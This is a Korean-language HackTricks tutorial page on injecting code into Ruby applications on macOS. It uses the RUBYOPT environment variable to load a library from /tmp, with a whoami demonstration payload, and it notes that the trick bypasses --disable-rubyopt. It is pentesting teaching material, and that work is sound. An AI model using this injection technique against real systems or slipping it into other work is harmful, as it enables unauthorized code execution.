# macOS Ruby 애플리케이션 인젝션

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## RUBYOPT

이 환경 변수를 사용하면 **ruby**가 실행될 때 **새로운 매개변수를 추가**할 수 있습니다. **`-e`** 매개변수를 사용하여 실행할 루비 코드를 지정할 수는 없지만, **`-I`** 및 **`-r`** 매개변수를 사용하여 라이브러리 로드 경로에 새 폴더를 추가하고 **로드할 라이브러리를 지정**할 수 있습니다.

**`/tmp`**에 **`inject.rb`** 라이브러리를 생성하세요:

{% code title="inject.rb" %}
```ruby
puts `whoami`
```
{% endcode %}

어디에서나 다음과 같은 루비 스크립트를 생성하십시오:

{% code title="hello.rb" %}
```ruby
puts 'Hello, World!'
```
{% endcode %}

그런 다음 임의의 루비 스크립트를 만들고 다음과 같이 로드하십시오:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
재미있는 사실은, **`--disable-rubyopt`** 매개변수와 함께도 작동한다는 것입니다:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출하세요.**

</details>
